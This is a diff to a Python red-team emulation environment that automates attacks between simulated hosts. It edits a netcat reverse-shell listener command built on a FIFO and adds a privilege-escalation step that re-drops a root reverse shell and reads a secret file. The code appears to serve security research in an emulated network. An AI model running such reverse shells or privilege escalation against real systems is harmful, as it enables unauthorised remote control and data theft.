@@ -1,6 +1,7 @@
 
 import base64
 import ipaddress
+from time import sleep
 import networkx as nx
 from aco_emulator import ACOEmulator
 import re
@@ -164,7 +165,7 @@ class RedTeamEnv:
         node_colors = []
         for _, attr in self.graph.nodes(data=True):
             
-            if attr.get('impact'):
+            if attr.get('impact') == True:
                 node_colors.append('red')
             elif attr.get('access') == 'root':
                 node_colors.append('orange')
@@ -225,6 +226,7 @@ class RedTeamEnv:
         if relay_cmd:
             print(f"[>] Sending relayed command to {target_node}:\n{relay_cmd}")
             result = self.net.get("user0").cmd(relay_cmd).strip()
+            sleep(2)
             print(f"[<] Command result: {result}")
             return result
         else:
@@ -256,7 +258,7 @@ class RedTeamEnv:
             
             # encoded = base64.b64encode(cmd.encode()).decode()
             
-            sleep_time = 22 if 'network' in cmd else 3
+            sleep_time = 22 if 'network' in cmd else 5
             cmd = shlex.quote(cmd)
             empty_cmd = shlex.quote("")
             
@@ -296,7 +298,8 @@ class RedTeamEnv:
             f"touch {in_file} {out_file}",
 
             # This process sets up reverse shell listener piping output into fifo
-            f"bash -c \"tail -f {fifo_file} | nc -lnvp {revshell_port} | tee {out_file} &\"",
+            f"bash -c {shlex.quote(f"tail -f {fifo_file} | nc -lnvp {revshell_port} | tee {out_file} &")}",
+            f"sleep 2; "
         ]
 
         full_setup_cmd = " && ".join(setup_cmds)
@@ -313,6 +316,7 @@ class RedTeamEnv:
         
         print(f"[*] Dropping reverse shell from {to_host} to {from_host}:{revshell_port}")
         result = self.execute_command_on(from_host, command=revshell_cmd).strip()
+        # result = self.execute_command_on(from_host, command="sleep 4").strip()
 
         # Step 3: Register reverse shell path
         shell_type = "root" if username == "root" else "user"
@@ -405,9 +409,12 @@ class RedTeamEnv:
         
         print(f"[*] {source_node} executing privilege escalation on {target}")
         
+        self.delete_reverse_shell(source_node, target)
+        
         self.drop_reverse_shell(source_node, target, 'root', 'root')
         
         discover_cmd = f"cat /home/hacker/secret.txt"
+        result = self.execute_command_on(target, discover_cmd).strip()  
         result = self.execute_command_on(target, discover_cmd).strip()  
         
         for line in result.splitlines():
